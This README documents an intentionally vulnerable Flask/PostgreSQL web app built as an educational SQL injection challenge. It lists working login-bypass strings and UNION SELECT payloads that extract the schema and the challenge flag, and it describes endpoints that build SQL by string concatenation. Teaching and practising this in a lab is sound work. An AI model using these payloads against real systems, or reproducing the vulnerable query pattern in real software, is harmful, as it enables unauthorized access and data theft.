# SQL Injection Challenge - 3-Tier Web Application

This is a 3-tier web application designed as a SQL injection challenge for educational purposes. The application intentionally contains SQL injection vulnerabilities to demonstrate security risks.

## Architecture

- **Frontend Layer**: Web UI (HTML/CSS/JavaScript) served by Nginx
- **Backend Layer**: RESTful API microservice built with Flask (Python)
- **Database Layer**: PostgreSQL database

### Architecture Diagram

```mermaid
graph TB
    subgraph Client["Client Layer"]
        Browser[Web Browser]
    end
    
    subgraph Frontend["Frontend Layer - Port 8080"]
        Nginx[Nginx Server]
        HTML[index.html - Login and Admin UI]
        CSS[styles.css - Styling]
        JS[app.js - Frontend Logic and Session Management]
        Nginx --> HTML
        Nginx --> CSS
        Nginx --> JS
    end
    
    subgraph Backend["Backend Layer - Port 5001"]
        Flask[Flask Application]
        LoginAPI["/api/login - Vulnerable Login"]
        SessionAPI["/api/session - Session Check"]
        LogoutAPI["/api/logout - Logout"]
        ComputersAPI["/api/computers - List Computers"]
        SearchAPI["/api/search - Vulnerable Search"]
        HealthAPI["/api/health - Health Check"]
        Flask --> LoginAPI
        Flask --> SessionAPI
        Flask --> LogoutAPI
        Flask --> ComputersAPI
        Flask --> SearchAPI
        Flask --> HealthAPI
    end
    
    subgraph Database["Database Layer - Port 5432"]
        PostgreSQL[(PostgreSQL Database)]
        UsersTable[("users table: id, username, password, role")]
        ComputersTable[("computers table: id, computer_name, ip_address")]
        FlagTable[("flag table: id, flag")]
        PostgreSQL --> UsersTable
        PostgreSQL --> ComputersTable
        PostgreSQL --> FlagTable
    end
    
    Browser -->|HTTP Requests| Nginx
    JS -->|API Calls| Flask
    LoginAPI -->|SQL Queries| PostgreSQL
    SessionAPI -->|Session Check| PostgreSQL
    ComputersAPI -->|SQL Queries| PostgreSQL
    SearchAPI -->|Vulnerable SQL| PostgreSQL
    
    style LoginAPI fill:#ff6b6b
    style SearchAPI fill:#ff6b6b
    style UsersTable fill:#4ecdc4
    style ComputersTable fill:#4ecdc4
    style FlagTable fill:#ffe66d
```

**Legend:**
- 🔴 Red: Vulnerable endpoints (SQL injection)
- 🔵 Blue: Database tables
- 🟡 Yellow: Flag table (challenge target)

## Features

1. **Vulnerable Login Page**: SQL injection can be used to bypass authentication
2. **Session Management**: Users stay logged in after page refresh (session persistence)
3. **Access Control**: Only users with login ID "admin" can access the admin panel
4. **Admin Panel**: After successful admin login, users can view a list of computers
5. **Vulnerable Search**: SQL injection in the search bar can be used to extract database schema information
6. **Flag Challenge**: Extract the hidden flag from the database using SQL injection

## Prerequisites

- Docker and Docker Compose installed

## Quick Start

1. Clone or navigate to this directory
2. Run the application:
   ```bash
   docker-compose up --build
   ```

3. Access the application:
   - Frontend: http://localhost:8080
   - Backend API: http://localhost:5001
   - Database: localhost:5432

## SQL Injection Challenges

### Challenge 1: Login Bypass

Try these payloads in the username or password field:

- `' OR '1'='1`
- `' OR '1'='1' --`
- `' OR 1=1 --`
- `admin' --`
- `' OR '1'='1' /*`

### Challenge 2: Schema Extraction

After logging in as admin, try these **working** payloads in the search box:

**Extract Table Names and Columns:**
- `' AND 1=0 UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema='public' --`

**Extract Just Table Names:**
- `' AND 1=0 UNION SELECT 1, tablename, null FROM pg_tables WHERE schemaname='public' --`

**Note:** 
- The query selects 3 columns (id, computer_name, ip_address), so UNION SELECT must also return 3 columns
- Use integer `1` for the first column to match the `id` type
- `AND 1=0` ensures the original query returns no results, showing only the UNION SELECT data
- Results appear in: ID column (1), Computer Name column (table/column names), IP Address column (data types)

### Challenge 3: Extract the Flag

Find and extract the flag from the `flag` table:

- `' AND 1=0 UNION SELECT 1, flag, null FROM flag --`

The flag will appear in the "Computer Name" column.

See `SQL_INJECTION_GUIDE.md` for detailed instructions and a Python demo script.

## Default Credentials

- Username: `admin`, Password: `admin123` (admin access - can see computer list)
- Username: `user1`, Password: `password1` (standard user - limited access)
- Username: `test`, Password: `test123` (standard user - limited access)

**Important:** Only users with login ID "admin" can access the admin panel and computer list, regardless of SQL injection attempts.

## Project Structure

```
_itp4416_asmt/
├── backend/
│   ├── app.py              # Flask API with vulnerable endpoints
│   ├── init_db.py          # Database initialization script
│   ├── requirements.txt    # Python dependencies
│   └── Dockerfile         # Backend container definition
├── frontend/
│   ├── index.html         # Main HTML page
│   ├── styles.css         # CSS styling
│   ├── app.js             # Frontend JavaScript
│   └── Dockerfile         # Frontend container definition
├── docker-compose.yml     # Orchestration file
├── sql_injection_demo.py  # Python script to demonstrate SQL injection
├── SQL_INJECTION_GUIDE.md # Detailed guide with working examples
└── README.md             # This file
```

## API Endpoints

- `POST /api/login` - Login endpoint (vulnerable to SQL injection, creates session)
- `GET /api/session` - Get current session information
- `POST /api/logout` - Logout and clear session
- `GET /api/computers?username=admin` - Get list of computers (requires admin username)
- `GET /api/search?username=admin&q=<search_term>` - Search computers (vulnerable to SQL injection, requires admin)
- `GET /api/health` - Health check endpoint

**Note:** Endpoints check for admin access based on the username/login ID, not just role.

## Database Schema

The database contains the following tables:

- **users**: Stores user credentials (id, username, password, role)
- **computers**: Stores computer information (id, computer_name, ip_address)
- **flag**: Contains the challenge flag (id, flag)

## Security Warning

⚠️ **This application is intentionally vulnerable and should NEVER be deployed to production!**

This is an educational tool designed to demonstrate SQL injection vulnerabilities. The code contains intentional security flaws for learning purposes.

**Vulnerabilities demonstrated:**
- SQL injection in login endpoint
- SQL injection in search endpoint
- Improper input validation
- Direct string concatenation in SQL queries

## Stopping the Application

```bash
docker-compose down
```

To remove volumes (database data):
```bash
docker-compose down -v
```

## Additional Resources

- `SQL_INJECTION_GUIDE.md` - Detailed guide with step-by-step instructions
- `sql_injection_demo.py` - Python script demonstrating automated SQL injection extraction

## Troubleshooting

**Port already in use:**
- Backend uses port 5001 (changed from 5000 to avoid conflicts)
- Frontend uses port 8080
- Database uses port 5432

**Session not persisting:**
- The application uses both server-side sessions (cookies) and localStorage as fallback
- Clear browser cache if experiencing issues

**Database initialization:**
- Database is automatically initialized on first startup
- To reset: `docker-compose down -v && docker-compose up --build`
